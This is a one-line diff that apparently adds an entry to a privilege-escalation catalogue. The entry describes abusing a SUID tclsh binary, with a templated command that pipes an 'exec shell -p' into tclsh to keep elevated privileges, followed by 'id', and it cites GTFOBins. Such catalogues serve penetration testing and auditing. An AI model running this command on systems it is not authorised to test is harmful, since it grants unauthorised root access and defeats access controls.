@@ -1,0 +1,1 @@
+{"id":"suid_tclsh","category":"SUID_GTFOBINS","binary":"tclsh","cve":null,"exploitation":["echo 'exec {{shell}} -p' | {{binary}}"],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["suid","gtfobins"],"severity":"high"}
